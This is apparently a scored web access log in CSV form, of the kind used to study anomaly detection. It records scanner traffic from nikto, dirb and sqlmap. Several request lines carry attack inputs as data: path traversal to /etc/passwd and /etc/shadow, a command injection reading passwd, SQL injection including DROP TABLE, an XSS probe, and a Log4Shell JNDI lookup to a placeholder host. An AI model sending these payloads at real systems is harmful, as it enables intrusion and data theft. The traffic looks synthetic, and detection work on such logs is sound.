score_content,score_session,score_fused,score_fused_norm,line
4.627218723297119,,4.627218723297119,4.627218723297119,31.104.246.157 - - [10/Jan/2025:12:12:48 +0000] "POST /login HTTP/1.1" 200 10912 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.1979751586914,,71.1979751586914,71.1979751586914,100.194.113.234 - - [10/Jan/2025:12:12:49 +0000] "HEAD /search?q=phone HTTP/1.1" 304 5717 "https://twitter.com/" "nikto/2.5.0"
12.6588134765625,,12.6588134765625,12.6588134765625,173.12.123.136 - - [10/Jan/2025:12:12:50 +0000] "PUT /server-status HTTP/1.1" 204 17173 "-" "dirb/2.22"
26.75426483154297,,26.75426483154297,26.75426483154297,104.174.18.169 - - [10/Jan/2025:12:12:52 +0000] "DELETE /dashboard HTTP/1.1" 200 12961 "https://twitter.com/" "sqlmap/1.7.2#stable"
68.51163482666016,,68.51163482666016,68.51163482666016,196.76.241.39 - - [10/Jan/2025:12:12:54 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 859 "https://twitter.com/" "curl/7.85.0"
30171.701171875,,30171.701171875,30171.701171875,34.56.206.193 - - [10/Jan/2025:12:12:57 +0000] "DELETE /search?q=router HTTP/1.1" 403 1123 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11062.7763671875,,11062.7763671875,11062.7763671875,184.217.87.174 - - [10/Jan/2025:12:12:57 +0000] "POST /search?q=headphones HTTP/1.1" 503 760 "https://example.com/" "dirb/2.22"
74.5526123046875,,74.5526123046875,74.5526123046875,204.83.243.95 - - [10/Jan/2025:12:13:00 +0000] "OPTIONS /about HTTP/1.1" 302 1649 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.6393585205078125,,4.6393585205078125,4.6393585205078125,199.39.63.175 - - [10/Jan/2025:12:13:03 +0000] "GET /profile HTTP/1.1" 304 10489 "https://www.google.com/" "python-requests/2.31.0"
12.917614936828613,,12.917614936828613,12.917614936828613,210.61.12.167 - - [10/Jan/2025:12:13:05 +0000] "PUT /login HTTP/1.1" 200 14942 "https://www.google.com/" "dirb/2.22"
103.10424041748047,,103.10424041748047,103.10424041748047,212.98.26.187 - - [10/Jan/2025:12:13:08 +0000] "TRACE /login HTTP/1.1" 200 17634 "-" "python-requests/2.31.0"
30124.048828125,,30124.048828125,30124.048828125,218.97.157.109 - - [10/Jan/2025:12:13:11 +0000] "GET /assets/app.js HTTP/1.1" 400 1336 "https://twitter.com/" "sqlmap/1.7.2#stable"
2.2489569187164307,,2.2489569187164307,2.2489569187164307,246.150.102.138 - - [10/Jan/2025:12:13:11 +0000] "GET / HTTP/1.1" 200 7008 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
2.815473794937134,,2.815473794937134,2.815473794937134,117.90.77.36 - - [10/Jan/2025:12:13:11 +0000] "POST /../../etc/passwd HTTP/1.1" 200 14578 "https://example.com/" "python-requests/2.31.0"
125.03713989257812,,125.03713989257812,125.03713989257812,117.22.37.214 - - [10/Jan/2025:12:13:11 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 3276 "https://news.ycombinator.com/" "curl/7.85.0"
93.9609603881836,,93.9609603881836,93.9609603881836,84.177.214.31 - - [10/Jan/2025:12:13:11 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15386 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
94.14470672607422,,94.14470672607422,94.14470672607422,187.8.179.44 - - [10/Jan/2025:12:13:14 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16029 "https://www.google.com/" "sqlmap/1.7.2#stable"
103.0609130859375,,103.0609130859375,103.0609130859375,30.124.200.188 - - [10/Jan/2025:12:13:15 +0000] "TRACE /logout HTTP/1.1" 200 15900 "-" "curl/7.85.0"
125.01488494873047,,125.01488494873047,125.01488494873047,155.153.168.169 - - [10/Jan/2025:12:13:17 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 7274 "https://www.google.com/" "curl/7.85.0"
71.88970947265625,,71.88970947265625,71.88970947265625,136.148.5.252 - - [10/Jan/2025:12:13:18 +0000] "OPTIONS /profile HTTP/1.1" 200 6533 "https://twitter.com/" "curl/7.85.0"
11049.2939453125,,11049.2939453125,11049.2939453125,35.89.157.33 - - [10/Jan/2025:12:13:21 +0000] "PUT /login HTTP/1.1" 503 1208 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.29248562455177307,,0.29248562455177307,0.29248562455177307,126.23.38.73 - - [10/Jan/2025:12:13:24 +0000] "GET /assets/app.css HTTP/1.1" 200 18390 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
12.715169906616211,,12.715169906616211,12.715169906616211,231.40.13.234 - - [10/Jan/2025:12:13:25 +0000] "PUT /api/products HTTP/1.1" 200 2467 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
103.00752258300781,,103.00752258300781,103.00752258300781,219.65.167.39 - - [10/Jan/2025:12:13:25 +0000] "TRACE /profile HTTP/1.1" 200 10740 "https://twitter.com/" "nikto/2.5.0"
15.373815536499023,,15.373815536499023,15.373815536499023,64.242.207.46 - - [10/Jan/2025:12:13:27 +0000] "PUT /api/products HTTP/1.1" 304 2401 "https://example.com/" "dirb/2.22"
0.2963200807571411,,0.2963200807571411,0.2963200807571411,41.108.94.74 - - [10/Jan/2025:12:13:28 +0000] "GET /assets/app.css HTTP/1.1" 200 19765 "https://news.ycombinator.com/" "nikto/2.5.0"
23.994415283203125,,23.994415283203125,23.994415283203125,67.76.119.136 - - [10/Jan/2025:12:13:30 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 19102 "https://www.google.com/" "dirb/2.22"
93.89710235595703,,93.89710235595703,93.89710235595703,246.111.183.40 - - [10/Jan/2025:12:13:31 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 1346 "https://news.ycombinator.com/" "dirb/2.22"
125.0297622680664,,125.0297622680664,125.0297622680664,194.71.246.35 - - [10/Jan/2025:12:13:33 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 11313 "https://example.com/" "python-requests/2.31.0"
37.552528381347656,,37.552528381347656,37.552528381347656,224.158.207.126 - - [10/Jan/2025:12:13:34 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 11809 "-" "dirb/2.22"
74.47997283935547,,74.47997283935547,74.47997283935547,213.63.221.92 - - [10/Jan/2025:12:13:34 +0000] "OPTIONS /contact HTTP/1.1" 302 3534 "https://twitter.com/" "nikto/2.5.0"
0.3733063042163849,,0.3733063042163849,0.3733063042163849,156.64.108.134 - - [10/Jan/2025:12:13:35 +0000] "GET /index.html HTTP/1.1" 200 9666 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
46.560035705566406,,46.560035705566406,46.560035705566406,153.105.202.144 - - [10/Jan/2025:12:13:35 +0000] "HEAD /about HTTP/1.1" 201 4966 "https://news.ycombinator.com/" "dirb/2.22"
30128.130859375,,30128.130859375,30128.130859375,195.1.43.225 - - [10/Jan/2025:12:13:38 +0000] "POST /about HTTP/1.1" 401 980 "https://www.google.com/" "dirb/2.22"
2.2642128467559814,,2.2642128467559814,2.2642128467559814,6.57.235.188 - - [10/Jan/2025:12:13:39 +0000] "GET / HTTP/1.1" 200 10843 "https://example.com/" "sqlmap/1.7.2#stable"
0.2901836335659027,,0.2901836335659027,0.2901836335659027,65.23.187.65 - - [10/Jan/2025:12:13:41 +0000] "GET /assets/app.css HTTP/1.1" 200 17591 "https://twitter.com/" "dirb/2.22"
72.00386810302734,,72.00386810302734,72.00386810302734,35.31.12.229 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 18200 "https://www.google.com/" "curl/7.85.0"
71.9677505493164,,71.9677505493164,71.9677505493164,17.99.175.63 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 7387 "https://example.com/" "sqlmap/1.7.2#stable"
71.94921875,,71.94921875,71.94921875,206.207.215.64 - - [10/Jan/2025:12:13:44 +0000] "OPTIONS /logout HTTP/1.1" 200 12746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.54668426513672,,68.54668426513672,68.54668426513672,200.204.174.42 - - [10/Jan/2025:12:13:46 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2002 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.46901273727417,,4.46901273727417,4.46901273727417,63.33.132.80 - - [10/Jan/2025:12:13:46 +0000] "GET /phpmyadmin HTTP/1.1" 301 7717 "https://news.ycombinator.com/" "curl/7.85.0"
93.97455596923828,,93.97455596923828,93.97455596923828,105.16.215.34 - - [10/Jan/2025:12:13:46 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 12337 "https://example.com/" "sqlmap/1.7.2#stable"
34.95734405517578,,34.95734405517578,34.95734405517578,196.127.229.203 - - [10/Jan/2025:12:13:49 +0000] "PUT /search?q=ssd HTTP/1.1" 200 6720 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7573570013046265,,1.7573570013046265,1.7573570013046265,230.23.120.165 - - [10/Jan/2025:12:13:52 +0000] "GET /server-status HTTP/1.1" 204 4687 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.547231197357178,,4.547231197357178,4.547231197357178,244.150.52.122 - - [10/Jan/2025:12:13:53 +0000] "POST /profile HTTP/1.1" 200 9558 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2950003445148468,,0.2950003445148468,0.2950003445148468,246.81.124.113 - - [10/Jan/2025:12:13:53 +0000] "GET /assets/app.js HTTP/1.1" 200 11397 "https://example.com/" "dirb/2.22"
26.512462615966797,,26.512462615966797,26.512462615966797,163.173.41.148 - - [10/Jan/2025:12:13:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3508 "-" "nikto/2.5.0"
2.873655080795288,,2.873655080795288,2.873655080795288,40.162.205.135 - - [10/Jan/2025:12:13:59 +0000] "GET /assets/app.js HTTP/1.1" 301 1824 "https://www.google.com/" "dirb/2.22"
71.87940979003906,,71.87940979003906,71.87940979003906,56.87.121.234 - - [10/Jan/2025:12:13:59 +0000] "OPTIONS /contact HTTP/1.1" 200 4006 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.873680114746094,,26.873680114746094,26.873680114746094,182.152.69.211 - - [10/Jan/2025:12:14:01 +0000] "DELETE /about HTTP/1.1" 200 6659 "https://twitter.com/" "nikto/2.5.0"
68.5234375,,68.5234375,68.5234375,234.132.86.62 - - [10/Jan/2025:12:14:02 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 2101 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
68.43026733398438,,68.43026733398438,68.43026733398438,114.73.64.70 - - [10/Jan/2025:12:14:04 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13652 "-" "dirb/2.22"
26.7722225189209,,26.7722225189209,26.7722225189209,57.69.139.22 - - [10/Jan/2025:12:14:06 +0000] "DELETE /dashboard HTTP/1.1" 200 18886 "https://example.com/" "python-requests/2.31.0"
26.662702560424805,,26.662702560424805,26.662702560424805,58.35.41.199 - - [10/Jan/2025:12:14:09 +0000] "POST /search?q=phone HTTP/1.1" 200 17427 "https://twitter.com/" "nikto/2.5.0"
11.426097869873047,,11.426097869873047,11.426097869873047,165.233.226.225 - - [10/Jan/2025:12:14:09 +0000] "PUT /.env HTTP/1.1" 200 3040 "https://twitter.com/" "python-requests/2.31.0"
45.155879974365234,,45.155879974365234,45.155879974365234,158.159.191.104 - - [10/Jan/2025:12:14:09 +0000] "HEAD /.env HTTP/1.1" 200 11940 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
46.578739166259766,,46.578739166259766,46.578739166259766,25.29.234.204 - - [10/Jan/2025:12:14:09 +0000] "HEAD /login HTTP/1.1" 201 9602 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.993797302246094,,23.993797302246094,23.993797302246094,175.228.71.179 - - [10/Jan/2025:12:14:09 +0000] "GET /search?q=monitor HTTP/1.1" 200 6527 "https://news.ycombinator.com/" "python-requests/2.31.0"
12.88968276977539,,12.88968276977539,12.88968276977539,195.81.145.199 - - [10/Jan/2025:12:14:10 +0000] "PUT /logout HTTP/1.1" 200 18439 "https://www.google.com/" "python-requests/2.31.0"
127.68193817138672,,127.68193817138672,127.68193817138672,175.91.116.168 - - [10/Jan/2025:12:14:12 +0000] "TRACE /search?q=router HTTP/1.1" 304 6493 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
68.5606460571289,,68.5606460571289,68.5606460571289,235.143.162.178 - - [10/Jan/2025:12:14:12 +0000] "HEAD /search?q=camera HTTP/1.1" 200 12994 "https://example.com/" "curl/7.85.0"
24.024354934692383,,24.024354934692383,24.024354934692383,142.183.78.44 - - [10/Jan/2025:12:14:14 +0000] "GET /search?q=camera HTTP/1.1" 200 8725 "-" "Wget/1.21.2 (linux-gnu)"
2.234013557434082,,2.234013557434082,2.234013557434082,125.182.6.238 - - [10/Jan/2025:12:14:15 +0000] "GET / HTTP/1.1" 200 3547 "https://www.google.com/" "sqlmap/1.7.2#stable"
12.836309432983398,,12.836309432983398,12.836309432983398,102.242.94.55 - - [10/Jan/2025:12:14:18 +0000] "PUT /contact HTTP/1.1" 200 12955 "https://twitter.com/" "dirb/2.22"
0.4046252965927124,,0.4046252965927124,0.4046252965927124,175.16.64.132 - - [10/Jan/2025:12:14:20 +0000] "GET /index.html HTTP/1.1" 200 19265 "-" "dirb/2.22"
48.9754753112793,,48.9754753112793,48.9754753112793,5.216.105.175 - - [10/Jan/2025:12:14:21 +0000] "DELETE /search?q=ssd HTTP/1.1" 201 19684 "-" "Wget/1.21.2 (linux-gnu)"
30157.9453125,,30157.9453125,30157.9453125,31.247.93.129 - - [10/Jan/2025:12:14:23 +0000] "PUT /search?q=router HTTP/1.1" 403 545 "https://twitter.com/" "curl/7.85.0"
96.56700897216797,,96.56700897216797,96.56700897216797,51.126.140.213 - - [10/Jan/2025:12:14:23 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 301 17272 "https://www.google.com/" "curl/7.85.0"
2.070390224456787,,2.070390224456787,2.070390224456787,244.181.222.54 - - [10/Jan/2025:12:14:25 +0000] "GET /login HTTP/1.1" 200 17827 "https://twitter.com/" "dirb/2.22"
30124.404296875,,30124.404296875,30124.404296875,155.14.133.119 - - [10/Jan/2025:12:14:25 +0000] "GET /index.html HTTP/1.1" 404 107 "https://www.google.com/" "curl/7.85.0"
2.019644021987915,,2.019644021987915,2.019644021987915,134.141.139.120 - - [10/Jan/2025:12:14:26 +0000] "GET /about HTTP/1.1" 200 4058 "https://www.google.com/" "curl/7.85.0"
11085.3955078125,,11085.3955078125,11085.3955078125,114.91.215.115 - - [10/Jan/2025:12:14:28 +0000] "DELETE /search?q=headphones HTTP/1.1" 503 921 "https://www.google.com/" "python-requests/2.31.0"
25.226686477661133,,25.226686477661133,25.226686477661133,182.91.81.19 - - [10/Jan/2025:12:14:30 +0000] "DELETE /.git/config HTTP/1.1" 200 17380 "https://twitter.com/" "sqlmap/1.7.2#stable"
71.82220458984375,,71.82220458984375,71.82220458984375,105.22.27.220 - - [10/Jan/2025:12:14:30 +0000] "OPTIONS /api/products HTTP/1.1" 200 446 "https://example.com/" "dirb/2.22"
15.317023277282715,,15.317023277282715,15.317023277282715,25.220.247.184 - - [10/Jan/2025:12:14:32 +0000] "PUT /phpmyadmin HTTP/1.1" 302 3167 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.777139663696289,,1.777139663696289,1.777139663696289,75.212.104.2 - - [10/Jan/2025:12:14:32 +0000] "GET /server-status HTTP/1.1" 200 7885 "-" "dirb/2.22"
30124.130859375,,30124.130859375,30124.130859375,109.168.123.136 - - [10/Jan/2025:12:14:32 +0000] "GET /index.html HTTP/1.1" 400 1372 "-" "nikto/2.5.0"
11038.5634765625,,11038.5634765625,11038.5634765625,156.48.234.231 - - [10/Jan/2025:12:14:33 +0000] "GET / HTTP/1.1" 503 1033 "-" "nikto/2.5.0"
24.087913513183594,,24.087913513183594,24.087913513183594,13.228.173.82 - - [10/Jan/2025:12:14:34 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 2528 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.286259651184082,,2.286259651184082,2.286259651184082,154.15.88.73 - - [10/Jan/2025:12:14:36 +0000] "GET / HTTP/1.1" 200 17579 "https://www.google.com/" "nikto/2.5.0"
102.90861511230469,,102.90861511230469,102.90861511230469,68.120.186.165 - - [10/Jan/2025:12:14:38 +0000] "TRACE /dashboard HTTP/1.1" 200 2415 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.3501318693161011,,0.3501318693161011,0.3501318693161011,9.93.48.130 - - [10/Jan/2025:12:14:40 +0000] "GET /index.html HTTP/1.1" 200 4184 "https://news.ycombinator.com/" "nikto/2.5.0"
103.97266387939453,,103.97266387939453,103.97266387939453,47.232.69.44 - - [10/Jan/2025:12:14:41 +0000] "TRACE /wp-login.php HTTP/1.1" 302 5818 "https://twitter.com/" "nikto/2.5.0"
46.31627655029297,,46.31627655029297,46.31627655029297,22.113.171.92 - - [10/Jan/2025:12:14:42 +0000] "HEAD /server-status HTTP/1.1" 200 8044 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.3125070631504059,,0.3125070631504059,0.3125070631504059,16.76.157.81 - - [10/Jan/2025:12:14:45 +0000] "GET /assets/app.js HTTP/1.1" 200 16720 "https://www.google.com/" "curl/7.85.0"
48.891502380371094,,48.891502380371094,48.891502380371094,187.132.163.187 - - [10/Jan/2025:12:14:47 +0000] "DELETE /api/product?id=123 HTTP/1.1" 204 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.06578063964844,,49.06578063964844,49.06578063964844,227.163.234.86 - - [10/Jan/2025:12:14:49 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17376 "https://news.ycombinator.com/" "python-requests/2.31.0"
93.8723373413086,,93.8723373413086,93.8723373413086,218.175.64.211 - - [10/Jan/2025:12:14:52 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 11295 "https://news.ycombinator.com/" "curl/7.85.0"
0.31402063369750977,,0.31402063369750977,0.31402063369750977,241.137.254.135 - - [10/Jan/2025:12:14:53 +0000] "GET /assets/app.js HTTP/1.1" 200 17229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
68.58041381835938,,68.58041381835938,68.58041381835938,53.97.131.188 - - [10/Jan/2025:12:14:54 +0000] "HEAD /search?q=phone HTTP/1.1" 200 11936 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
34.90215301513672,,34.90215301513672,34.90215301513672,161.14.93.250 - - [10/Jan/2025:12:14:54 +0000] "PUT /search?q=router HTTP/1.1" 200 11968 "-" "Wget/1.21.2 (linux-gnu)"
124.95594024658203,,124.95594024658203,124.95594024658203,9.119.66.198 - - [10/Jan/2025:12:14:56 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 6234 "-" "nikto/2.5.0"
34.88505935668945,,34.88505935668945,34.88505935668945,128.161.29.102 - - [10/Jan/2025:12:14:57 +0000] "PUT /search?q=laptop HTTP/1.1" 200 7439 "https://twitter.com/" "nikto/2.5.0"
48.872535705566406,,48.872535705566406,48.872535705566406,225.97.103.145 - - [10/Jan/2025:12:14:58 +0000] "DELETE /search?q=laptop HTTP/1.1" 201 10871 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.174595355987549,,7.174595355987549,7.174595355987549,58.92.216.171 - - [10/Jan/2025:12:15:01 +0000] "POST /logout HTTP/1.1" 302 2240 "https://twitter.com/" "sqlmap/1.7.2#stable"
68.52771759033203,,68.52771759033203,68.52771759033203,152.141.75.96 - - [10/Jan/2025:12:15:03 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 3969 "https://www.google.com/" "curl/7.85.0"
30171.7578125,,30171.7578125,30171.7578125,212.139.251.112 - - [10/Jan/2025:12:15:05 +0000] "DELETE /search?q=phone HTTP/1.1" 403 386 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
93.96099090576172,,93.96099090576172,93.96099090576172,180.116.172.87 - - [10/Jan/2025:12:15:06 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 12067 "https://www.google.com/" "sqlmap/1.7.2#stable"
29.26934242248535,,29.26934242248535,29.26934242248535,210.137.192.64 - - [10/Jan/2025:12:15:06 +0000] "POST /search?q=router HTTP/1.1" 304 14372 "-" "dirb/2.22"
37.5085563659668,,37.5085563659668,37.5085563659668,58.160.57.14 - - [10/Jan/2025:12:15:09 +0000] "PUT /search?q=phone HTTP/1.1" 302 9008 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
125.03276062011719,,125.03276062011719,125.03276062011719,11.21.249.130 - - [10/Jan/2025:12:15:12 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 6326 "https://www.google.com/" "nikto/2.5.0"
46.609920501708984,,46.609920501708984,46.609920501708984,229.156.74.32 - - [10/Jan/2025:12:15:13 +0000] "HEAD /login HTTP/1.1" 200 18725 "https://example.com/" "curl/7.85.0"
26.61366081237793,,26.61366081237793,26.61366081237793,136.86.113.91 - - [10/Jan/2025:12:15:15 +0000] "POST /search?q=router HTTP/1.1" 200 9652 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9683218002319336,,2.9683218002319336,2.9683218002319336,88.26.37.73 - - [10/Jan/2025:12:15:15 +0000] "GET /assets/app.css HTTP/1.1" 304 18731 "https://www.google.com/" "nikto/2.5.0"
26.723390579223633,,26.723390579223633,26.723390579223633,242.245.197.1 - - [10/Jan/2025:12:15:18 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 15603 "https://twitter.com/" "dirb/2.22"
24.087230682373047,,24.087230682373047,24.087230682373047,199.83.141.2 - - [10/Jan/2025:12:15:21 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1924 "https://twitter.com/" "nikto/2.5.0"
46.29469680786133,,46.29469680786133,46.29469680786133,204.147.36.244 - - [10/Jan/2025:12:15:23 +0000] "HEAD /server-status HTTP/1.1" 200 2441 "https://www.google.com/" "dirb/2.22"
71.07410430908203,,71.07410430908203,71.07410430908203,205.167.145.242 - - [10/Jan/2025:12:15:24 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 15361 "https://example.com/" "sqlmap/1.7.2#stable"
4.546452045440674,,4.546452045440674,4.546452045440674,186.93.249.51 - - [10/Jan/2025:12:15:26 +0000] "POST /profile HTTP/1.1" 200 9356 "https://example.com/" "curl/7.85.0"
93.94570922851562,,93.94570922851562,93.94570922851562,109.119.52.242 - - [10/Jan/2025:12:15:28 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10645 "https://www.google.com/" "sqlmap/1.7.2#stable"
